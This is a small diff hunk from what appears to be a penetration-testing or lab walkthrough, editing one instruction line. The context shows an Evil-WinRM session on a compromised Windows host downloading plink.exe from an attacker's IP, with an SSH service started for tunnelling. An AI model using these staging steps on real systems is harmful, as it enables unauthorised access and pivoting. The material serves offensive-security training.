@@ -413,7 +413,7 @@ FIRST, we need to start our SSH service so that plink.exe has something to talk 
 -> sudo service ssh start
 
 
-Put plink.exe on the target and run:
+Put plink.exe on the target:
 
 
 Evil-WinRM PS C:\Users\MichelleWat\Documents> Invoke-WebRequest -Uri "http://10.13.45.227/plink.exe" -outfile "plink.exe"
